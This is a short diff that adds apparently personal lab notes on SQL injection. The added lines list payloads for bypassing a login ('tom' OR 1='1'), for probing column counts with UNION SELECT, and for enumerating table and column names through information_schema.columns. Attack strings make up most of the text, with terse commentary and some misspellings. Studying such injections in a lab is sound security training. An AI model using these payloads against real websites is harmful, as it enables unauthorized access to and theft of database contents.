@@ -27,3 +27,10 @@ SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
 
 cat /var/www/html
 
+login with tom'or1='1, post, request, raw, copy, addressbar ?, paste boom shakalaca
+IP/Union.html
+Ford' OR 1='1
+find vulnerable, incriment by ine. Audi' union select 1,2,3,4,5; # (# means comment ignore)
+
+                                (2 is not there)        (5 colums)
+Audi' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns; #
